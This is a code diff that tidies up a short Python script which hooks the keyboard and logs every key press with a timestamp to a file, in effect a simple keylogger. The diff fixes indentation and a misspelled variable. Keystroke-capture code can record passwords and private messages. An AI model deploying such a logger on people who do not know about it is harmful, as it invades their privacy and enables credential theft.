@@ -11,21 +11,21 @@ logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s:
 # Define a function to handle keyboard events
 def on_key_press(key):
    # Get the current timestamp
-timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+   timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
 
-  # Write the key press event to the log file 
-logging.info(f"{timestamp} - key pressed:{key}")
+   # Write the key press event to the log file 
+   logging.info(f"{timestamp} - key pressed: {key}")
 
-  # Define a function to handle keyboard interrupts
+# Define a function to handle keyboard interrupts
 def signal_handler(sig, frame):
-    print("\n I love Black widow, Annce!")
+    print("\nI love Black widow, Annce!")
     sys.exit(0)
     
-  # Set the keyboard hook
+# Set the keyboard hook
 listener = keyboard.listener(on_press=on_key_press)
 
-  # Start the keyboard hook
-listner.start()
+# Start the keyboard hook
+listener.start()
 
 # Set the signal handler
 signal.signal(signal.SIGINT,signal_handler)
